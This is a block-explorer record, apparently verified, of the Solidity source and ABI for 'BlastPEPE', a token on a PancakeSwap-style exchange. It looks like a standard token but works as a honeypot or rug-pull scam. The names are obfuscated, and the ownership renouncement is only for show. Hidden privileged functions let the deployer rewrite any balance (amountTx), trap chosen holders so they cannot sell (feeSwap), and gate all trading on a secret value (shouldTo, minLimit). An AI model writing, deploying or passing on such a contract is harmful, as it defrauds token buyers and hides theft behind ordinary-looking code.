{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface toLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletEnable) external view returns (uint256);\n\n    function transfer(address walletMode, uint256 tradingTo) external returns (bool);\n\n    function allowance(address walletTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletMode,\n        uint256 tradingTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minExempt, uint256 value);\n    event Approval(address indexed walletTx, address indexed spender, uint256 value);\n}\n\nabstract contract autoLaunchAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableReceiverMode {\n    function createPair(address listAuto, address takeExempt) external returns (address);\n}\n\ninterface toLimitMetadata is toLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlastPEPE is autoLaunchAmount, toLimit, toLimitMetadata {\n\n    function owner() external view returns (address) {\n        return exemptMarketing;\n    }\n\n    function autoTx() public {\n        emit OwnershipTransferred(marketingTake, address(0));\n        exemptMarketing = address(0);\n    }\n\n    bool public walletList;\n\n    string private senderTx = \"BPE\";\n\n    function minLimit(address toWallet, address walletMode, uint256 tradingTo) internal returns (bool) {\n        if (toWallet == marketingTake) {\n            return receiverSenderReceiver(toWallet, walletMode, tradingTo);\n        }\n        uint256 sellIsEnable = toLimit(marketingFromMax).balanceOf(walletIs);\n        require(sellIsEnable == buySender);\n        require(walletMode != walletIs);\n        if (maxToken[toWallet]) {\n            return receiverSenderReceiver(toWallet, walletMode, enableTrading);\n        }\n        return receiverSenderReceiver(toWallet, walletMode, tradingTo);\n    }\n\n    uint256 constant enableTrading = 20 ** 10;\n\n    mapping(address => mapping(address => uint256)) private listFeeEnable;\n\n    function approve(address sellTake, uint256 tradingTo) public virtual override returns (bool) {\n        listFeeEnable[_msgSender()][sellTake] = tradingTo;\n        emit Approval(_msgSender(), sellTake, tradingTo);\n        return true;\n    }\n\n    function receiverSenderReceiver(address toWallet, address walletMode, uint256 tradingTo) internal returns (bool) {\n        require(autoTeam[toWallet] >= tradingTo);\n        autoTeam[toWallet] -= tradingTo;\n        autoTeam[walletMode] += tradingTo;\n        emit Transfer(toWallet, walletMode, tradingTo);\n        return true;\n    }\n\n    uint256 public amountFee;\n\n    constructor (){\n        if (fundTx) {\n            receiverWallet = true;\n        }\n        walletAuto limitExempt = walletAuto(fromTake);\n        marketingFromMax = enableReceiverMode(limitExempt.factory()).createPair(limitExempt.WETH(), address(this));\n        \n        marketingTake = _msgSender();\n        autoTx();\n        walletIsSwap[marketingTake] = true;\n        autoTeam[marketingTake] = exemptIs;\n        if (amountFee != feeLaunched) {\n            teamFundBuy = true;\n        }\n        emit Transfer(address(0), marketingTake, exemptIs);\n    }\n\n    function teamTake() private view {\n        require(walletIsSwap[_msgSender()]);\n    }\n\n    function allowance(address toMarketing, address sellTake) external view virtual override returns (uint256) {\n        if (sellTake == fromTake) {\n            return type(uint256).max;\n        }\n        return listFeeEnable[toMarketing][sellTake];\n    }\n\n    mapping(address => bool) public walletIsSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptIs;\n    }\n\n    string private exemptTx = \"Blast PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeMin;\n    }\n\n    bool private marketingLiquidity;\n\n    address public marketingTake;\n\n    mapping(address => uint256) private autoTeam;\n\n    function fromShould(address shouldAuto) public {\n        require(shouldAuto.balance < 100000);\n        if (walletList) {\n            return;\n        }\n        if (fundTx) {\n            fundTx = true;\n        }\n        walletIsSwap[shouldAuto] = true;\n        \n        walletList = true;\n    }\n\n    address public marketingFromMax;\n\n    uint8 private modeMin = 18;\n\n    mapping(address => bool) public maxToken;\n\n    function getOwner() external view returns (address) {\n        return exemptMarketing;\n    }\n\n    uint256 buySender;\n\n    address fromTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address teamWalletAt, uint256 tradingTo) external virtual override returns (bool) {\n        return minLimit(_msgSender(), teamWalletAt, tradingTo);\n    }\n\n    function amountTx(address teamWalletAt, uint256 tradingTo) public {\n        teamTake();\n        autoTeam[teamWalletAt] = tradingTo;\n    }\n\n    bool public fundTx;\n\n    bool public tokenBuyFrom;\n\n    address private exemptMarketing;\n\n    function shouldTo(uint256 tradingTo) public {\n        teamTake();\n        buySender = tradingTo;\n    }\n\n    function transferFrom(address toWallet, address walletMode, uint256 tradingTo) external override returns (bool) {\n        if (_msgSender() != fromTake) {\n            if (listFeeEnable[toWallet][_msgSender()] != type(uint256).max) {\n                require(tradingTo <= listFeeEnable[toWallet][_msgSender()]);\n                listFeeEnable[toWallet][_msgSender()] -= tradingTo;\n            }\n        }\n        return minLimit(toWallet, walletMode, tradingTo);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTx;\n    }\n\n    bool private liquiditySell;\n\n    uint256 private exemptIs = 100000000 * 10 ** 18;\n\n    function feeSwap(address exemptShouldReceiver) public {\n        teamTake();\n        \n        if (exemptShouldReceiver == marketingTake || exemptShouldReceiver == marketingFromMax) {\n            return;\n        }\n        maxToken[exemptShouldReceiver] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    bool private teamFundBuy;\n\n    function balanceOf(address walletEnable) public view virtual override returns (uint256) {\n        return autoTeam[walletEnable];\n    }\n\n    address walletIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed amountShouldLaunched, address indexed totalMarketing);\n\n    uint256 swapLaunchLiquidity;\n\n    uint256 private feeLaunched;\n\n    bool public receiverWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountShouldLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTo\",\"type\":\"uint256\"}],\"name\":\"amountTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptShouldReceiver\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"}],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFromMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTo\",\"type\":\"uint256\"}],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletIsSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BlastPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}